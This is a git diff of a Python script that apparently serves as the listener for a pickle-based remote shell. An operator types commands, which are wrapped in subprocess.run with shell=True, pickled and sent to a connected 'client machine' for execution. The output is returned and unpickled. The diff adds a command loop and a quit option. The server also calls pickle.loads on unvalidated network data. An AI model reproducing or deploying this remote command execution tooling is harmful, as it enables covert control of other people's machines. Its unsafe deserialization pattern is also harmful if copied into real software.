@@ -17,18 +17,6 @@ ui_image = """888b     d888                   888    d8b              888b     d
               Y8b d88P                                                                                                                       
                "Y88P"    """
 
-#Pickle Dictionary
-#class command(ABC):
-#     @abstractmethod
-#     def run(self):
-#         pass
-
-# class helloPickle(command):
-#     # Hellow world pickle
-#     def run(self):
-#         created_pickle = pickle.dumps("Hello pickle!")
-#         return created_pickle
-
 pickleCommand1 = """result = subprocess.run('"""
 
 pickleCommand2 = """', stdout=subprocess.PIPE, text=True, shell=True)
@@ -44,21 +32,26 @@ def pickleMainTesting():
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.bind((HOST, PORT))
         s.listen()
-        userCommand = input(">> ")
-        data = pickle.dumps(pickleCommand1 + userCommand + pickleCommand2)
-        conn, addr = s.accept()
-        with conn:
-            conn.sendall(data)
-            print(f"Connected by {addr}")
-            recieved = conn.recv(1024000)
-            deSerialized = pickle.loads(recieved)
-            #if not recieved:
-            print(deSerialized)
+        while True:
+            conn, addr = s.accept()
+            with conn:
+                userCommand = input(">> ")
+                if userCommand == "quit":
+                    data = pickle.dumps("quit")
+                else:
+                    data = pickle.dumps(pickleCommand1 + userCommand + pickleCommand2)
+                conn.sendall(data)
+                if userCommand == "quit":
+                    break
+                recieved = conn.recv(1024000)
+                deSerialized = pickle.loads(recieved)
+                #if not recieved:
+                print(deSerialized)
 
 
 __name__ = "__main__"
 
 if __name__ == "__main__":
     print(ui_image)
-    #userInput = input("\nSelect the action you wish to take:\n1. print \"hello pickle\" on client machine\n2. retrieve file names within client machine's current directory\n")
+    print("type 'quit' to terminate connection")
     pickleMainTesting()
